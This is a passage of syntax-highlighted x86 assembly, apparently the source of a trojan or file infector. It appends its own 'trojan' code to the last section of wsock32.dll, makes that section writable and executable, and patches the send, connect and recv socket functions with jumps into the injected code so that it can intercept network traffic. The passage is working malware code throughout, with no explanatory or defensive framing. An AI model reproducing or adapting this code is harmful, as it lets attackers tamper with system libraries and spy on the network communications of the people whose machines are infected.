</span><span class="sc1">;   mov [base],ebx   ;   Base adress   ;  error</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   sections start</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">0C0000000H</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;   last section</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize3</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize3</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mem</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">0C0000000H</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize3</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;    RVA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">ntpe</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">120</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   get offset</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">rva</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'dnes'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_send</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_send_2_ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tce'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'nnoc'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_connect</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_connect_2_ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'vcer'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ap_recv</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">base</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_recv_2_ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">base</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">raw</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc1">; replace instructions</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_send_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_send_byte</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">   </span><span class="sc1">;  jmp</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_send_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0"> </span><span class="sc1">;  xxx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_send_byte</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_connect_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_connect_byte</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@003</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_connect_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_connect_byte</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_recv_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_recv_byte</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rva</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@005</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@001</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_recv_2_ch</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_recv_byte</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">; save api's to be used by wsock32 loader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_api</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kernel_txt_api</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GlobalAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IsBadReadPtr'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">

   </span><span class="sc5">kernel_txt_api</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LLD.'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'23LE'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetModuleHandleA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">wsock32@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api_txt_all</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wsock_txt_api</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'recv'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">

   </span><span class="sc5">wsock_txt_api</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wsock32_addr</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api_txt_all</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IO@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
